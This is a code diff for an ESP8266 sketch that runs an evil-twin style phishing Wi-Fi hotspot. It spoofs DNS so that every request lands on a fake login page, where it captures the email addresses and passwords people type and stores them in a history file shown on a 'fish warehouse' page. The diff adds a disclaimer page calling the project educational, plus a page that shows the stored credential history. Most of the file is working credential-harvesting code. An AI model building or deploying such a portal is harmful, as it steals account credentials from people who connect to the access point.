@@ -26,10 +26,12 @@
 #define SUBTITLE "这是个钓鱼wifi"
 #define TITLE "愿者上钩："
 #define BODY "这个网页会诱骗你输入你的账号和密码"
-#define DATA "数据页面，还没有建立完成"
-#define INFO "储存的密码和账号"
+#define DATA "历史记录"
+#define INFO "免责声明"
 #define POST_TITLE "捕获中..."
 #define POST_BODY "你刚刚输入的账户和密码已经被捕获，访问10.10.10.1/creds或直接点击鱼仓库链接可以看到捕获结果</br>愿者上钩"
+#define LAWC "  该项目仅用于个人学习和研究使用。<br>ESP8266及其SDK都不是为此目的而设计或构建的。<br>可能会有 Bug 出现！请仅在自己的网络和设备上使用！<br>"
+#define LAWE "  This project is a proof of concept for testing and educational purposes.<br>Neither the ESP8266, nor its SDK was meant or build for such purposes. <br>Bugs can occur!Use it only against your own networks and devices!<br>"
 #define PASS_TITLE "鱼仓库"
 #define CLEAR_TITLE "清除完成"
 
@@ -40,6 +42,7 @@ const byte TICK_TIMER = 1000;
 IPAddress APIP(10, 10, 10, 1);
 
 String Credentials = "";
+String FISH  = "储存的密码和账号";
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer; ESP8266WebServer webServer(80);
 
@@ -76,13 +79,14 @@ String header(String t) {
 }
 
 String creds() {
-  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:black\" href=/>回到钓鱼页面</a></p><p><a style=\"color:black\" href=/clear>清除捕获的信息</a></p><p><a style=\"color:black\" href=/data>前往数据页面</a></p></center>" + footer();
+  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:black\" href=/>回到钓鱼页面</a></p><p><a style=\"color:black\" href=/clear>清除捕获的信息</a></p><p><a style=\"color:black\" href=/data>前往数据页面</a></p><p><a style=\"color:black\" href=/info>前往声明页面</a></p></center>" + footer();
 }
 
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
          "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
-         "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=确认></form></center>" + footer();
+         "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=确认></form></center>" +
+         "</ol><br><p><a style=\"color:black\" href=/info>免责声明</a></p>" + footer();
 }
 
 String posted() {
@@ -104,7 +108,15 @@ String clear() {
 }
 
 String data() {
-  return header(DATA) + "<div>"  + INFO + "</ol></div><div><form action=/creds method=creds>" + "<input type=submit value=返回鱼仓库></form></center>" + footer();
+  File myFile;
+  myFile = SPIFFS.open("/history.txt", "r");//打开历史记录文件，"r"代表读取内容
+  FISH = myFile.readString();
+  myFile.close();
+  return header(DATA) + "<div>"  + FISH + "</ol></div><div><form action=/creds method=creds>" + "<input type=submit value=返回鱼仓库></form></center>" + footer();
+}
+
+String info() {
+  return header(INFO) + "<div>"  + LAWC + LAWE + "</ol></div><div><form action=/ method=/>" + "<input type=submit value=我已阅读并明白上述注意事项></form></center>" + footer();
 }
 
 void history(String email, String password) {
@@ -179,6 +191,9 @@ void setup() {
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(SSID_NAME);
   dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
+  webServer.on("/info", []() {
+    webServer.send(HTTP_CODE, "text/html", info());
+  });
   webServer.on("/post", []() {
     webServer.send(HTTP_CODE, "text/html", posted());
     BLINK();
@@ -228,14 +243,10 @@ void setup() {
 
 }
 
-
 void loop() {
   if ((millis() - lastTick) > TICK_TIMER) {
     lastTick = millis();
   }
-
-  //Serial.println(DATA);
-
   dnsServer.processNextRequest();
   webServer.handleClient();
 }
